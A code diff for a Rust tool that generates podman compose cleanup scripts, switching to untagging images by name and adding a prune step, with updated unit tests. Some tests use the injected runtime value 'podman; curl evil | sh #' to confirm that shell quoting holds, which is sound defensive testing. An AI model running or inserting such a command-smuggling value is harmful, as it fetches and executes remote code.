@@ -334,15 +334,16 @@ fn status_script(runtime: &str) -> String {
     )
 }
 
-/// Enumerate this compose project's built images by reference prefix and `rmi -f` them after `down` — direct because compose's own `--rmi local` scopes via labels that podman-compose (python) doesn't always write. Reference filter naturally excludes pulled bases (`postgres:16`, `redis:7`, …) since compose names built images `<project>-<service>` while pulled ones keep their upstream repo name.
+/// Untag this compose project's built images (by name, never by id) after `down`, then prune dangling build-cache leaves. Using names lets podman's ref-count decide: a sibling worktree whose build cached to the same image ID keeps its own tag and the shared image survives — a force-rm by id would take the sibling's containers along with the image. Reference filter naturally excludes pulled bases (`postgres:16`, `redis:7`, …) since compose names built images `<project>-<service>` while pulled ones keep their upstream repo name. `WS_KEEP_IMAGES=1` skips both the untag and the dangling prune.
 fn post_remove_script(runtime: &str) -> String {
     format!(
         r#"v="-v"; [ -n "$WS_KEEP_VOLUMES" ] && v=""
 imgs=""
-[ -z "$WS_KEEP_IMAGES" ] && imgs=$({r} images --filter reference="${{COMPOSE_PROJECT_NAME}}*" -q 2>/dev/null | sort -u)
+[ -z "$WS_KEEP_IMAGES" ] && imgs=$({r} images --filter reference="${{COMPOSE_PROJECT_NAME}}*" --format '{{{{.Repository}}}}:{{{{.Tag}}}}' 2>/dev/null | grep -v '<none>' | sort -u)
 {r} compose down $v
 status=$?
-[ -n "$imgs" ] && {r} rmi -f $imgs >/dev/null 2>&1
+[ -n "$imgs" ] && {r} rmi $imgs >/dev/null 2>&1
+[ -z "$WS_KEEP_IMAGES" ] && {r} image prune -f >/dev/null 2>&1
 exit $status
 "#,
         r = crate::remote::shell_quote(runtime),
@@ -681,11 +682,22 @@ mod tests {
             s.contains(r#"[ -n "$WS_KEEP_VOLUMES" ]"#),
             "must branch on $WS_KEEP_VOLUMES to toggle the -v flag: {s}"
         );
+        // Enumerate by tag name, not `-q` (image id): siblings whose builds cached to
+        // the same id share the underlying image, and force-removing by id would take
+        // out their containers.
         assert!(
-            s.contains(r#"podman images --filter reference="${COMPOSE_PROJECT_NAME}*" -q"#),
-            "must enumerate images by project-scoped reference (excludes pulled bases): {s}"
+            s.contains(r#"podman images --filter reference="${COMPOSE_PROJECT_NAME}*" --format '{{.Repository}}:{{.Tag}}'"#),
+            "must enumerate images by tag name (never by id), scoped to this project: {s}"
         );
-        assert!(s.contains("podman rmi -f"), "must prune the enumerated images: {s}");
+        assert!(
+            !s.contains("podman rmi -f"),
+            "must NOT force-remove — untag-only lets podman's ref-count keep shared image alive: {s}"
+        );
+        assert!(s.contains("podman rmi $imgs"), "must untag the enumerated images: {s}");
+        assert!(
+            s.contains("podman image prune -f"),
+            "must also drop dangling build-cache leaves so per-worktree churn doesn't need manual pruning: {s}"
+        );
         assert!(
             s.contains(r#"[ -z "$WS_KEEP_IMAGES" ]"#),
             "must branch on $WS_KEEP_IMAGES before enumerating images: {s}"
@@ -705,7 +717,11 @@ mod tests {
         assert!(!s.contains("podman; curl evil | sh # compose"), "unquoted runtime leaked: {s}");
         assert!(s.contains("'podman; curl evil | sh #' compose down $v"), "compose down must be quoted: {s}");
         assert!(s.contains("'podman; curl evil | sh #' images --filter"), "images query must be quoted: {s}");
-        assert!(s.contains("'podman; curl evil | sh #' rmi -f"), "rmi must be quoted: {s}");
+        assert!(s.contains("'podman; curl evil | sh #' rmi $imgs"), "rmi must be quoted: {s}");
+        assert!(
+            s.contains("'podman; curl evil | sh #' image prune -f"),
+            "dangling prune must be quoted: {s}"
+        );
     }
 
     use super::*;
